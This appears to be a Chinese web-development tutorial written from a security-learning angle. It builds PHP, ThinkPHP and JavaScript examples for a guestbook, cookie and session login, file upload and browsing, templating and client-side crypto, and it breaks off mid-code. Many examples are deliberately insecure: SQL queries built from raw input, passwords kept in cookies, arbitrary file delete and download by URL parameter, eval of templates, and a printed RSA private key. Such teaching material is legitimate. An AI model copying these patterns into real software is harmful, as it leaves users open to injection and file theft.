$_ENV：是一个包含服务器端环境变量的数组，$_COOKIE：是一个关联数组，包含通过cookie传递给当前脚本的内容 $_SESSION：是一个关联数组，包含当前脚本中所有session内容 代码php和html混合写 action为空，则表单提交给自己，以username来传递用户名，以content传递内容的值，写一个插入并显示留言的 addshow.php 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;form id=&quot;form1&quot; name=&quot;form1&quot; method=&quot;post&quot; action=&quot;&quot;&gt; &lt;p&gt; 用户名：&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt; &lt;/p&gt; &lt;p&gt; 内容： &lt;/p&gt; &lt;p&gt; &lt;textarea name=&quot;content&quot;&gt;&lt;/textarea&gt; &lt;/p&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; id=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;&lt;?php$dbip=&#x27;localhost&#x27;;$dbuser=&#x27;root&#x27;;$dbpass=&#x27;123456&#x27;;$dbname=&#x27;test&#x27;;$uername=@$_POST[&#x27;username&#x27;];$content=@$_POST[&#x27;content&#x27;];$ip=@$_SERVER[&#x27;REMOTE_ADDR&#x27;];$ua=@$_SERVER[&#x27;HTTP_USER_AGENT&#x27;];$con=mysqli_connect($dbip,$dbuser,$dbpass,$dbname);if (!$con)&#123; die(&quot;数据库连接错误&quot;.mysqli_connect_error());&#125;else&#123; $sql=&quot;insert into test_table(username,content,ipaddr,useragent) value(&#x27;$uername&#x27;,&#x27;$content&#x27;,&#x27;$ip&#x27;,&#x27;$ua&#x27;);&quot;; if (mysqli_query($con,$sql))&#123; echo &quot;&lt;script&gt;alert(&#x27;留言成功！&#x27;)&lt;/script&gt;&quot;; $sql_select=&quot;select * from test_table&quot;; $data=mysqli_query($con,$sql_select); while ($row=mysqli_fetch_row($data)) &#123; echo &#x27;&lt;hr&gt;&#x27;; echo &#x27;用户名：&#x27;.$row[0].&#x27;&lt;br&gt;&#x27;; echo &#x27;内容：&#x27;.$row[1].&#x27;&lt;br&gt;&#x27;; echo &#x27;IP地址：&#x27;.$row[2].&#x27;&lt;br&gt;&#x27;; echo &#x27;浏览器UA：&#x27;.$row[3].&#x27;&lt;br&gt;&#x27;; &#125; &#125;&#125;?&gt; 上面的代码中，在连接数据库那一段，如果你每次操作数据库时，都有把ip，user什么的都写一遍，很麻烦，所以我们可以先写一个数据库连接的文件，专门存放这类代码，如果要使用时，只需在别的文件中包含即可，比如我们定义一个 data_connect.php 1234567&lt;?php&gt;$dbip=&#x27;localhost&#x27;;$dbuser=&#x27;root&#x27;;$dbpass=&#x27;123456&#x27;;$dbname=&#x27;test&#x27;;$con=mysqli_connect($dbip,$dbuser,$dbpass,$dbname);?&gt; 如果我们在当前目录写一个删除的PHP文件，就叫delete.php 123456789101112131415161718192021&lt;?phpinclude &#x27;data_connect.php&#x27;;$sql_select=&quot;select * from test_table&quot;;$data=mysqli_query($con,$sql_select);while ($row=mysqli_fetch_row($data))&#123; echo &#x27;&lt;hr&gt;&#x27; echo &#x27;用户名：&#x27;.$row[0].&#x27;&lt;br&gt;&#x27;; echo &#x27;内容：&#x27;.$row[1].&#x27;&lt;br&gt;&#x27;; echo &#x27;IP地址：&#x27;.$row[2].&#x27;&lt;br&gt;&#x27;; echo &#x27;浏览器UA：&#x27;.$row[3].&#x27;&lt;br&gt;&#x27;; echo &quot;&lt;a href=&#x27;delete.php?del=$row[0]&#x27;&gt;删除&lt;/a&gt;&quot;;&#125;$del=@$_GET[&#x27;del&#x27;];if(isset($del))&#123; $sql_delete=&quot;delete from test_table where username = &#x27;$del&#x27;;&quot;; if(mysqli_query($con,$sql_delete))&#123; echo &quot;&lt;script&gt;alert(&#x27;删除成功！&#x27;)&lt;/script&gt;&quot;; &#125;&#125;?&gt; 不过这样写有些小bug，就是当用户名一致的时候，数据库里的数据都删除了，但是页面上的还在，所以，我们最好将功能分装成函数形式 所以我们的 addshow.php 最好这么写 123456789101112131415161718192021222324&lt;?phpinclude &#x27;data_connect.php&#x27;;function add_test($con)&#123; $uername=@$_POST[&#x27;username&#x27;]; $content=@$_POST[&#x27;content&#x27;]; $ip=@$_SERVER[&#x27;REMOTE_ADDR&#x27;]; $ua=@$_SERVER[&#x27;HTTP_USER_AGENT&#x27;]; $sql=&quot;insert into test_table(username,content,ipaddr,useragent) value(&#x27;$uername&#x27;,&#x27;$content&#x27;,&#x27;$ip&#x27;,&#x27;$ua&#x27;);&quot;; if (mysqli_query($con,$sql))&#123; echo &quot;&lt;script&gt;alert(&#x27;留言成功！&#x27;)&lt;/script&gt;&quot;&#125;function show_test($con)&#123; $sql_select=&quot;select * from test_table&quot;; $data=mysqli_query($con,$sql_select); while ($row=mysqli_fetch_row($data))&#123; echo &#x27;&lt;hr&gt;&#x27;; echo &#x27;用户名：&#x27;.$row[0].&#x27;&lt;br&gt;&#x27;; echo &#x27;内容：&#x27;.$row[1].&#x27;&lt;br&gt;&#x27;; echo &#x27;IP地址：&#x27;.$row[2].&#x27;&lt;br&gt;&#x27;; echo &#x27;浏览器UA：&#x27;.$row[3].&#x27;&lt;br&gt;&#x27;; &#125; &#125;show_test($con);add_test($con); 调用插件–ueditor直接在我们的addshow.php中调用，将ueditor目录和addshow.php文件放在同一目录，引用即可，具体如何调用可以看相关教程，不多赘述 12345&lt;script src=&quot;/ueditor/ueditor.config.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/ueditor/ueditor.all.js&quot;&gt;&lt;/script&gt;-------&lt;script type=&quot;text/javascript&quot;&gt;UE.getEditor(&quot;content&quot;);&lt;/script&gt;------- 后台模块Cookie生成Cookie的流程： 1、客户端向服务器发送HTTP请求。2、服务器检查请求头中是否包含cookie信息。3、如果请求头中包含cookie信息，则服务器使用该cookie来识别客户端，否则服务器将生成一个新的cookie。4、服务器在响应头中设置cookie信息并将其发送回客户端。5、客户端接收响应并将cookie保存在本地。6、当客户端发送下一次HTTP请求时，它会将cookie信息附加到请求头中。7、服务器收到请求并检查cookie的有效性。8、如果cookie有效，则服务器响应请求。否则，服务器可能会要求客户端重新登录。 简单来说cookie是用户身份的凭证，存储在用户浏览器，存储容量有限，一般为4kb，可以设置过期时间 代码新建三个文件，login.php、index.php、logout.php login.php 123456789101112131415161718&lt;?phpinclude &#x27;data_connect.php&#x27;;$username=$_POST[&#x27;username&#x27;];$password=$_POST[&#x27;password&#x27;];$sql=&quot;select * from admin where username=&#x27;$username&#x27; and password=&#x27;$password&#x27;;&quot;;$data=mysqli_query($con,$sql);if($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;)&#123; if(mysqli_num_rows($data)&gt;0)&#123; $expire = time()+60*60*24; // 一天后过期 setcookie(&#x27;username&#x27;, $username, $expire, &#x27;/&#x27;); setcookie(&#x27;password&#x27;, $password, $expire, &#x27;/&#x27;); header(&#x27;Location: index.php&#x27;); exit(); &#125;else&#123; echo &#x27;&lt;script&gt;alert(&#x27;登录失败！&#x27;)&lt;/script&gt;&#x27;; &#125;&#125;?&gt; index.php 12345678&lt;?phpif($_COOKIE[&#x27;username&#x27;]!==&#x27;admin&#x27; and $_COOKIE[&#x27;password&#x27;]!==&#x27;123456&#x27;)&#123; header(&#x27;Location: login.php&#x27;)&#125;?&gt;&lt;h1&gt;后台首页&lt;/h1&gt;&lt;p&gt;欢迎你，&lt;?php echo $_COOKIE[&#x27;username&#x27;];?&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;logout.php&quot;&gt;退出登录&lt;/a&gt;&lt;/p&gt; logout.php 123456&lt;?phpsetcookie(&#x27;username&#x27;,&#x27;&#x27;,time()-3600,&#x27;/&#x27;);setcookie(&#x27;password&#x27;,&#x27;&#x27;,time()-3600,&#x27;/&#x27;);header(&#x27;Location: login.php&#x27;);exit();?&gt; Sessionsession是用户的会话凭证，存储在服务端，存储容量取决于服务器的硬件和配置，一般默认在浏览器关闭后或退出登录就会过期，session文件被删除 session_start(): 启动会话，用于开始或恢复一个已经存在的会话$_SESSION: 用于存储和访问当前会话中的所有变量session_destroy(): 销毁当前会话中的所有数据session_unset(): 释放当前会话中的所有变量 在PHP.INI中session.save_path设置路径 代码同理，还是新建三个文件，login.php、index.php、logout.php login.php 大体上和cookie那边的代码差不多，具体的函数不一样 123session_start();$_SESSION[&#x27;username&#x27;]=$username;$_SESSION[&#x27;password&#x27;]=$password; index.php 12session_start();// 把cookie函数换成session函数即可 logout.php 123session_start();session_unset();session_destroy(); Token1.身份验证：采用token机制的Web应用程序，用户在登录成功后会收到一个token，这个token可以在每次请求时发送给服务器进行身份验证。而不采用token机制的Web应用程序，一般会使用session机制来保存用户登录状态，服务器会在用户登录成功后创建一个session，之后的每个请求都需要在HTTP头中附带这个session ID，以便服务器能够验证用户身份。2、安全性：采用token机制的Web应用程序，在服务器上不会存储用户的登录状态，只需要存储token即可。因此，即使token被盗取，黑客也无法获得用户的密码或者其他敏感信息。而不采用token机制的Web应用程序，一般会在服务器上存储用户的登录状态，因此如果服务器被黑客攻击，黑客可能会获得用户的敏感信息。3、跨域访问：采用token机制的Web应用程序，在跨域访问时，可以使用HTTP头中的Authorization字段来传递token信息，方便实现跨域访问。而不采用token机制的Web应用程序，在跨域访问时，需使用cookie或session来传递用户身份信息，比较麻烦。总之，采用token机制可以提高Web应用程序的安全性，并且方便实现跨域访问。不过，使用token机制也需要开发者自己来实现身份验证和token的生成和验证，相对来说比较复杂。而不采用token机制，使用session机制则相对简单，但是安全性相对较低。因此，具体采用哪种机制，需要根据实际情况进行权衡和选择。 代码写两个php文件，一个生成token为token.php，一个检查token为check_token.php token.php 123456789101112&lt;?php$token = bin2hex(random_bytes(16)); //随机生成$_SESSION[&#x27;token&#x27;] = $token; //将token保存到session中setcookie(&#x27;token&#x27;,$token,time()+3600,&#x27;/&#x27;); //将token绑定到cookie中?&gt;&lt;div class=&quot;login&quot;&gt; &lt;h2&gt;后台登录&lt;/h2&gt; &lt;form action=&quot;check_token.php&quot; method=&quot;post&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;token&quot; value=&quot;&lt;?php echo $token; ?&gt;&quot;&gt; &lt;/form&gt;&lt;/div&gt; check_token.php 1234567891011121314151617&lt;?phpsession_start();$token=$_COOKIE[&#x27;token&#x27;];if($token !== $_SESSION[&#x27;token&#x27;])&#123; header(&#x27;HTTP/1.1 403 Forbidden&#x27;); $_SESSION[&#x27;token&#x27;] = bin2hex(random_bytes(16)); echo &#x27;Accession denied&#x27;; exit;&#125;else&#123; $_SESSION[&#x27;token&#x27;] = bin2hex(random_bytes(16)); if($_POST[&#x27;username&#x27;]==&#x27;admin&#x27; &amp;&amp; $_POST[&#x27;password&#x27;]==&#x27;123456&#x27;)&#123; echo &#x27;success&#x27;; &#125;else&#123; echo &#x27;failure&#x27;; &#125; &#125;?&gt; 文件管理上传$_FILES：PHP中一个预定义的超全局变量，用于在上传文件时从客户端接收文件，并将其保存到服务器上。它是一个包含上传文件信息的数组，包括文件名、类型、大小、临时文件名等信息。$_FILES[“表单值”][“name”]获取上传文件原始名称$_FILES[“表单值”][“type”]获取上传文件MIME类型$_FILES[“表单值”][“size”]获取上传文件字节单位大小$_FILES[“表单值”][“tmp_name”]获取上传的临时副本文件名$_FILES[“表单值”][“error”]获取上传时发生的错误代码move_uploaded_file() 将上传的文件移动到指定位置的函数 无过滤代码1234567891011121314$name=$_FILES[&#x27;f&#x27;][&#x27;name&#x27;];$type=$_FILES[&#x27;f&#x27;][&#x27;type&#x27;];$size=$_FILES[&#x27;f&#x27;][&#x27;size&#x27;];$tmp_name=$_FILES[&#x27;f&#x27;][&#x27;tmp_name&#x27;];$error=$_FILES[&#x27;f&#x27;][&#x27;error&#x27;];echo $name.&quot;&lt;br&gt;&quot;;echo $type.&quot;&lt;br&gt;&quot;;echo $size.&quot;&lt;br&gt;&quot;;echo $tmp_name.&quot;&lt;br&gt;&quot;;echo $error.&quot;&lt;br&gt;&quot;;if(move_uploaded_file($tmp_name,&#x27;upload/&#x27;.$name))&#123; echo &quot;文件上传成功!&quot;;&#125; 黑名单过滤代码123456789$black_ext=array(&#x27;php&#x27;,&#x27;asp&#x27;,&#x27;jsp&#x27;,&#x27;aspx&#x27;); //定义黑名单后缀$fenge = explode(&#x27;.&#x27;,$name); //以点来拆分$exts = end($fenge); //取后缀if(in_array($exts,$black_ext))&#123; echo &#x27;非法后缀文件&#x27;.$exts;&#125;else&#123; move_uploaded_file($tmp_name,&#x27;upload/&#x27;.$name); echo &#x27;&lt;script&gt;alert(&quot;上传成功&quot;)&lt;/script&gt;&#x27;;&#125; 白名单过滤代码123456789$allow_ext=array(&#x27;png&#x27;,&#x27;jpg&#x27;,&#x27;gif&#x27;,&#x27;jpeg&#x27;);$fenge = explode(&#x27;.&#x27;,$name);$exts = end($fenge);if(!in_array($exts,$allow_ext))&#123; echo &#x27;非法后缀文件&#x27;.$exts;&#125;else&#123; move_uploaded_file($tmp_name,&#x27;upload/&#x27;.$name); echo &#x27;&lt;script&gt;alert(&quot;上传成功&quot;)&lt;/script&gt;&#x27;;&#125; 文件类型MIME机制过滤代码123// 和上面的代码差不多，把allow改一改$allow_ext=array(&#x27;image/png&#x27;,&#x27;image/jpg&#x27;);if(!in_array($type,$allow_ext)) OSS存储借助云产品OSS存储对象来存储文件 代码编写没什么区别，只需要加上accessid和accesskey和oss的地址即可，但是这个方法有泄漏的风险 显示is_dir() 函数用于检查指定的路径是否是一个目录opendir() 函数用于打开指定的目录readdir() 函数用于从打开的目录中读取目录中的文件和子目录open_basedir：PHP.INI中的设置用来限制脚本程序访问的目录 12345678910111213141516171819202122232425262728293031323334353637&lt;?php$dir = $_GET[&#x27;path&#x27;] ??: &#x27;./&#x27;;function filelist($dir)&#123; if($dh = opendir($dir))&#123; //循环读取文件列表 while readdir while(($file=readdir($dh) )!== false)&#123; //判断是文件还是文件夹 is_dir if(is_dir($file))&#123; echo &quot;&lt;li&gt;&lt;i class=&#x27;fa fa-folder&#x27;&gt;&lt;/i&gt; &lt;a href=&#x27;?path=$file&#x27;&gt;&quot;.$file.&#x27;&lt;/a&gt;&lt;/li&gt;&#x27;; &#125;else&#123; echo &#x27;&lt;li&gt;&lt;i class=&quot;fa fa-file&quot;&gt;&lt;/i&gt; &lt;a href=&quot;#&quot;&gt;&#x27;.$file.&#x27;&lt;/a&gt;&lt;/li&gt;&#x27;; &#125; &#125; &#125;&#125;filelist($dir);function del($file)&#123; if(!is_dir($file))&#123; unlink($file); echo &quot;&lt;script&gt;alert(&#x27;删除成功&#x27;)&lt;/script&gt;&quot;; &#125;&#125;if(isset($_GET[&#x27;del&#x27;]))&#123; del($_GET[&#x27;del&#x27;]);&#125;function down($filepath)&#123; $fileName = basename($filepath); // 修改http头实现文件读取解析下载 header(&quot;Content-Type: application/octet-stream&quot;); header(&quot;Content-Disposition: attachment; filename=\\&quot;&quot; . $fileName . &quot;\\&quot;&quot;); header(&quot;Content-Length: &quot; . filesize($filepath)); readfile($filepath);&#125;if(isset($_GET[&#x27;down&#x27;]))&#123; down($_GET[&#x27;down&#x27;]);&#125;?&gt; 包含include() 在错误发生后脚本继续执行require() 在错误发生后脚本停止执行include_once() 如果已经包含，则不再执行，与include()相同require_once() 如果已经包含，则不再执行，与include()相同 假如写一个1.txt，但是里面写的是php代码，当你包含这个1.txt时，还是会执行里面的PHP代码，从而造成危害 PHP框架类模版引用写一个美观的new.html，然后里面的值用 {} 来代替，php文件中先引用new.html，然后再去替换模版中的值 在渲染模版时，会解析代码，无论是数据库中还是页面中的都会被解析，因此像代码执行、xss这些都会因此而产生 123456789101112131415161718192021222324&lt;?phpinclude &#x27;config.php&#x27;;$template=file_get_contents(&#x27;new.html&#x27;);$id=$_GET[&#x27;id&#x27;] ?&#x27; &#x27;:&#x27;1&#x27;;$sql=&quot;select * from news where id=$id&quot;;$data=mysqli_query($con,$sql);while ($row=mysqli_fetch_row($data)) &#123; $page_title=$row[&#x27;1&#x27;]; $heading=$row[&#x27;2&#x27;]; $subheading=$row[&#x27;3&#x27;]; $content=$row[&#x27;4&#x27;]; $item=$row[&#x27;5&#x27;]; //echo $page_title;&#125;echo &quot;$page_title&lt;br&gt;$page_title&quot;;$template=str_replace(&#x27;&#123;page_title&#125;&#x27;,$page_title,$template);$template=str_replace(&#x27;&#123;heading&#125;&#x27;,$subheading,$template);$template=str_replace(&#x27;&#123;subheading&#125;&#x27;,$subheading,$template);$template=str_replace(&#x27;&#123;content&#125;&#x27;,$content,$template);$template=str_replace(&#x27;&#123;$item&#125;&#x27;,$item,$template);eval(&#x27;?&gt;&#x27; . $template); // ?&gt; 是为了闭合前面的php代码?&gt; Smarty是一个基于PHP开发的模版引擎，具体使用网上随便一搜都有 下载：https://github.com/smarty-php/smarty/releases 使用1、创建一个文件夹，命名为smarty-demo 2、下载Smarty对应版本并解压缩到该文件夹中 3、创建一个PHP文件，命名为index.php，并在文件中添加以下代码 123456789101112131415&lt;?php// 引入 Smarty 类文件require(&#x27;smarty-demo/libs/Smarty.class.php&#x27;);// 创建 Smarty 实例$smarty = new Smarty;// 设置 Smarty 相关属性$smarty-&gt;template_dir = &#x27;smarty-demo/templates/&#x27;;$smarty-&gt;compile_dir = &#x27;smarty-demo/templates_c/&#x27;;$smarty-&gt;cache_dir = &#x27;smarty-demo/cache/&#x27;;$smarty-&gt;config_dir = &#x27;smarty-demo/configs/&#x27;;// 赋值变量到模板中$smarty-&gt;assign(&#x27;title&#x27;, &#x27;欢迎使用 Smarty&#x27;);// 显示模板$smarty-&gt;display(&#x27;index.tpl&#x27;);?&gt; 4、创建一个名为index.tpl的模板文件，并将以下代码复制到上述点定义文件夹中 12345678910&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;&#123;$title&#125;&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;&#123;$title&#125;&lt;/h1&gt;&lt;p&gt;这是一个使用 Smarty 的例子。&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; 这时，你在这个index.tpl中添加php代码，不启任何作用，但是模版也会有很多漏洞 ThinkPHP路由访问控制tp框架涉及到一个路由问题：没有启用路由的情况下典型的URL访问规则是：http://serverName/index.php（或者其它应用入口文件）/模块/控制器/操作/[参数名/参数值…]，模块就是tp下的目录，控制器就是目录里的文件的class名，操作就是函数方法 比如上图代码中，在application目录下新建一个test目录，test目录下新建controller目录，controller目录下新建test.php文件，内容如下 123456789101112&lt;?phpnamespace app\\test\\controller;use think\\Controller;use think\\Request;class test extends Controller&#123; public function aaa() &#123; return $this-&gt;request-&gt;param(&#x27;x&#x27;); &#125;&#125;?&gt; 此时访问此文件为：xxxxx&#x2F;index.php&#x2F;test&#x2F;test&#x2F;aaa&#x2F;x&#x2F;123，即可返回123 数据库连接首先在application目录下database.php文件中将数据库的连接信息写好，然后我们比如在刚刚的test.php文件中写一个查询数据的操作 12345678use think\\Db;public function testsql()&#123;//使用tp框架操作mysql数据，如果按照推荐的写法，默认是受到框架内置过滤保护的 $id=request()-&gt;param(&#x27;x&#x27;); $data=Db::table(&#x27;news&#x27;)-&gt;where(&#x27;id&#x27;,$id)-&gt;find(); //SELECT * FROM `think_user` WHERE `id` = 1 LIMIT 1 return json($data);&#125; 文件上传1234567891011public function upload()&#123; $file = request()-&gt;file(&#x27;image&#x27;); $info = $file-&gt;validate([&#x27;ext&#x27;=&gt;&#x27;jpg,png,gif&#x27;])-&gt;move( &#x27;../uploads&#x27;); // 移动到框架应用根目录/uploads/ 目录下，仅允许jpg,png,gif格式 if($info)&#123; echo $info-&gt;getExtension(); echo $info-&gt;getSaveName(); echo $info-&gt;getFilename(); &#125;else&#123; echo $file-&gt;getError(); &#125;&#125; 前端页面渲染系统会按照默认规则自动定位模版文件，规则为： 当前模版&#x2F;view&#x2F;当前控制器（小写）&#x2F;当前操作（小写）.html 就比如在application&#x2F;index里面创建view&#x2F;index&#x2F;index.html，这个页面写点前端，然后在application&#x2F;index&#x2F;controller&#x2F;index.php中加上 1return $this-&gt;fetch(); 即可实现，fetch()里面不写默认是index 当前，前端页面也可以写变量，类似于Smarty的写法，这是index.php中通过如下方式来替换index.html中的 {$name} 和 {$email} 12$this-&gt;assign([&#x27;name&#x27;=&gt;&#x27;TP&#x27;,&#x27;email&#x27;=&gt;&#x27;aaa@qq.com&#x27;]);return $this-&gt;fetch(); JS原生类原生开发比如我们这里写一个文件上传的代码，js代码必须写在 script 两个之间 当需要调用js文件进行一个文件上传的后缀过滤时，在前端需要使用onchange事件 1&lt;input type=&quot;text&quot; onchange=&quot;myFunction()&quot;&gt; // 当用户改变input输入框内容时执行一段javascript代码 所以一般在上传按钮那边可以这么写 1&lt;input type=&quot;file&quot; id=&quot;file&quot; name=&quot;f&quot; onchange=&quot;CheckFile(this.value)&quot;&gt; 此时，我们的js过滤代码可以这么写 12345678910111213141516171819&lt;script&gt; function CheckFileExt(filename)&#123; var flag=false; var exts=[&#x27;png&#x27;,&#x27;gif&#x27;,&#x27;jpg&#x27;]; //规定白名单上传后缀 var index=filename.lastIndexOf(&quot;.&quot;); //返回.最后一次出现的位置，从前往后，从0开始数 var ext = filename.substr(index+1); for(i=0;i&lt;exts.length;i++)&#123; if(ext==exts[i])&#123; var flag=true; alert(&#x27;文件后缀正确！&#x27;); break; &#125; &#125; if(!flag)&#123; alert(&#x27;文件后缀错误！&#x27;) location.reload(true); &#125; &#125;&lt;/script&gt; 库开发引用jQuery库，写一个js的登录验证，jQuery的使用可以查看相关教程 1234567891011121314151617181920212223&lt;script src=&quot;js/jquery-1.12.4.js&quot;&gt;&lt;/script&gt;&lt;script&gt; $(&quot;button&quot;).click(function ()&#123; $.ajax(&#123; type: &#x27;POST&#x27;, url: &#x27;logincheck.php&#x27;, data: &#123; myuser:$(&#x27;.user&#x27;).val(), // 这里接收的表单值是在input标签中的class值，而不是name或者id值 mypass:$(&#x27;.pass&#x27;).val() &#125;, success: function (res)&#123; console.log(res); if(res[&#x27;infoCode&#x27;]==1)&#123; alert(&#x27;登录成功&#x27;); //登录成功处理事件，location.href=&#x27;index.php&#x27;; &#125;else&#123; alert(&#x27;登录失败&#x27;); &#125; &#125;, dataType: &#x27;json&#x27;, &#125;); &#125;);&lt;/script&gt; 后端的验证 123456789101112&lt;?php$user=$_POST[&#x27;myuser&#x27;];$pass=$_POST[&#x27;mypass&#x27;];//真实情况需要在数据库获取$success=array(&#x27;msg&#x27;=&gt;&#x27;ok&#x27;);if($user==&#x27;admin&#x27; &amp;&amp; $pass==&#x27;123456&#x27;)&#123; $success[&#x27;infoCode&#x27;]=1; echo &#x27;&lt;script&gt;location.href=&quot;index.php&quot;;&lt;/script&gt;&#x27;;&#125;else&#123; $success[&#x27;infoCode&#x27;]=0;&#125;echo json_encode($success); 注意，如果将 1echo &#x27;&lt;script&gt;location.href=&quot;index.php&quot;;&lt;/script&gt;&#x27;; 这一段写在js里面，会导致安全问题，直接抓返回包将值改为1就可以跳转 编码加密提前分装好对应的js文件，然后调用即可 MD5123456&lt;script src=&quot;js/md5.js&quot;&gt;&lt;/script&gt;&lt;script&gt; var str1 = &#x27;hello&#x27; var str_encode = md5(str1); console.log(str_encode) &lt;/script&gt; 其中，js目录下的md5.js为md5加密的规则文件 SHA112345678&lt;!DOCTYPE html&gt; &lt;script src=&quot;js/crypto-js.js&quot;&gt;&lt;/script&gt; &lt;script&gt; var str1 = &#x27;hello&#x27;; var str_encode = CryptoJS.SHA1(str1).toString(); console.log(str_encode) &lt;/script&gt;&lt;/html&gt; HMAC12345678&lt;script src=&quot;js/crypto-js.js&quot;&gt;&lt;/script&gt;&lt;script&gt; var key = &#x27;key&#x27;; var str1 = &#x27;hello&#x27;; var hash = CryptoJS.HmacSHA256(key, str1); var str_encode = CryptoJS.enc.Hex.stringify(hash); console.log(str_encode) // &#x27;11a7960cd583ee2c3f1ed910dbc3b6c3991207cbc527d122f69e84d13cc5ce5c&#x27;&lt;/script&gt; AES1234567891011121314151617181920212223&lt;script src=&quot;js/crypto-js.js&quot;&gt;&lt;/script&gt; &lt;script type=&quot;text/javascript&quot;&gt; var aseKey = &quot;12345678&quot; // 定制秘钥，长度必须为：8/16/32位, 长度不一致也没问题 var message = &quot;hello&quot;; // 需要加密的内容 // 加密 DES/AES切换只需要修改 CryptoJS.AES &lt;=&gt; CryptoJS.DES var encrypt = CryptoJS.AES.encrypt(message, CryptoJS.enc.Utf8.parse(aseKey), // 参数1=密钥, 参数2=加密内容 &#123; mode: CryptoJS.mode.ECB, // 为DES的工作方式 padding: CryptoJS.pad.Pkcs7 // 当加密后密文长度达不到指定整数倍(8个字节、16个字节)则填充对应字符 &#125; ).toString(); // toString=转字符串类型 console.log(encrypt); // 在弹窗中打印字符串 2vcsEDJv9vAZZLgFLjkZ9A== //解密 var decrypt = CryptoJS.AES.decrypt(encrypt, CryptoJS.enc.Utf8.parse(aseKey), // 参数1=密钥, 参数2=解密内容 &#123; mode: CryptoJS.mode.ECB, padding: CryptoJS.pad.Pkcs7 &#125; ).toString(CryptoJS.enc.Utf8); // toString=转字符串类型,并指定编码 console.log(decrypt); // &quot;xiaodisec&quot; &lt;/script&gt; RSA123456789101112131415161718&lt;script src=&quot;js/jsencrypt.js&quot;&gt;&lt;/script&gt; &lt;script type=&quot;text/javascript&quot;&gt; // 公钥 私匙是通过公匙计算生成的，不能盲目设置 var PUBLIC_KEY = &#x27;-----BEGIN PUBLIC KEY-----MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBALyBJ6kZ/VFJYTV3vOC07jqWIqgyvHulv6us/8wzlSBqQ2+eOTX7s5zKfXY40yZWDoCaIGk+tP/sc0D6dQzjaxECAwEAAQ==-----END PUBLIC KEY-----&#x27;; //私钥 var PRIVATE_KEY = &#x27;-----BEGIN PRIVATE KEY-----MIIBVQIBADANBgkqhkiG9w0BAQEFAASCAT8wggE7AgEAAkEAvIEnqRn9UUlhNXe84LTuOpYiqDK8e6W/q6z/zDOVIGpDb545NfuznMp9djjTJlYOgJogaT60/+xzQPp1DONrEQIDAQABAkEAu7DFsqQEDDnKJpiwYfUE9ySiIWNTNLJWZDN/Bu2dYIV4DO2A5aHZfMe48rga5BkoWq2LALlY3tqsOFTe3M6yoQIhAOSfSAU3H6jIOnlEiZabUrVGqiFLCb5Ut3Jz9NN+5p59AiEA0xQDMrxWBBJ9BYq6RRY4pXwa/MthX/8Hy+3GnvNw/yUCIG/3Ee578KVYakq5pih8KSVeVjO37C2qj60d3Ok3XPqBAiEAqGPvxTsAuBDz0kcBIPqASGzArumljkrLsoHHkakOfU0CIDuhxKQwHlXFDO79ppYAPcVO3bph672qGD84YUaHF+pQ-----END PRIVATE KEY-----&#x27;; //使用公钥加密 var encrypt = new JSEncrypt();//实例化加密对象 encrypt.setPublicKey(PUBLIC_KEY);//设置公钥 var message = &#x27;hello&#x27; // 需要加密的数据 var encrypted = encrypt.encrypt(message);//对指定数据进行加密 console.log(encrypted) // &#x27;JQ83h8tmJpsSZcb4BJ3eQvuqIAs3ejepcUUnoFhQEvum8fA8bf1Y/fG+DO1bSIVNJF6EOZKe4wa0njv6aOar9w==&#x27; //使用私钥解密 var decrypt = new JSEncrypt(); // 创建解密对象 decrypt.setPrivateKey(PRIVATE_KEY); //设置私钥 var uncrypted = decrypt.decrypt(encrypted); //解密 &#x27;xiaodisec&#x27; console.log(uncrypted); &lt;/script&gt; Dom树dom即文档操作对象，是浏览器提供的一套专门用来操作网页代码内容的功能，实现自主或用户交互动作反馈 12345678910111213141516&lt;h1 id=&quot;iii&quot; class=&quot;ccc&quot; onclick=&quot;getValue()&quot;&gt;标题标题&lt;/h1&gt;&lt;script&gt; function getValue()&#123; // 以下a，b，c三种写法都是获取对象的，输出结果都是： // &lt;h1 id=&quot;iii&quot; class=&quot;ccc&quot; onclick=&quot;getValue()&quot;&gt;标题&lt;/h1&gt; const a = document.querySelector(&quot;#iii&quot;) //id值前面加# const b = document.querySelector(&quot;.ccc&quot;) //class值前面用. const c = document.querySelector(&quot;h1&quot;) console.log(c) console.log(c.innerText) //输出结果为标题标题 console.log(c.id) //输出结果为iii console.log(c.className) //输出结果为ccc c.innerHTML = &quot;替换标题&lt;Hr&gt;&quot; //可以解析后续代码，输出结果为替换标题且有下划线 c.innerText = &quot;替换标题&lt;Hr&gt;&quot; //不可以解析后续代码，输出结果为替换标题&lt;Hr&gt; &#125;&lt;/script&gt; 前端代码通过DOM技术来实现代码的更新，如果更新的地方用户可控，就会造成DOM XSS 逆向调试这里基于上述知识做一个简单的调试和思路，更复杂高级的方法会在逆向中详细说明，找个申通快递官网登录示范一下 1、在密码输入框和登录处右键调试，一般可以看到id值或者name值，然后全局搜索这两个值，一般是一样的，相互结合，然后根据搜索到的地方一个个看，找到加密的地方，如下，先找id值，再找密码加密的地方（手机号是我随便输的，但是要保证正确） 2、在加密处下断点，然后点击登录，将加密逻辑复制到控制台，即可输出加密后的结果，然后我们就可以随意去替换明文内容 注意：这里一定要下断点才可以去调用，因为它需要在这个环境里面加载这些逻辑，没有走到断点点话就会报错未定义 JS框架类Node.JSNode.js是运行在服务端的JavaScript，简单理解就是你看到的结果是代码执行后的结果而非js代码 先在官网安装：https://nodejs.org/ ，重启电脑使环境变量生效，通过 npm i 来安装第三方库 基本教程可以参考 https://www.w3cschool.cn/nodejs/ 数据库连接查询以下是简单的demo，当然，存在sql注入，只是为了了解一下书写规则 123456789101112131415161718192021222324252627282930313233343536373839404142const express = require(&#x27;express&#x27;);const mysql=require(&#x27;mysql&#x27;)const app=express();const bodyParser = require(&#x27;body-parser&#x27;);var urlencodedParser = bodyParser.urlencoded(&#123; extended: false &#125;);app.post(&#x27;/login&#x27;,urlencodedParser,function(req,res)&#123; // req是发送数据，res是回显数据 const u = 